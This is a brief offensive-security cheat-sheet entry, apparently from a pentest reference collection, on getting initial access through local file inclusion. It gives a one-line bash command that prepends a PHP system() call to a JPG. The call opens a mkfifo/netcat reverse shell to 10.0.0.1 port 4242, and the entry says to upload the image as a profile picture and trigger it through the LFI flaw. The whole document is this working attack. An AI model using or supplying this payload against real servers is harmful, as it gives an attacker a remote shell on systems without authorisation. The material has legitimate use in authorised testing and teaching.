---
title: LFI via Malicious Image Upload
category: initial-access
subcategory: web-attacks
os: linux
command: cat - background.jpg > evil.jpg
tools: cat, echo
---


### Embed PHP into a JPG file

```bash
echo '<?php system("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f") ?>' | cat - background.jpg > evil.jpg
```

Upload as a profile picture, then include it via the LFI vector.
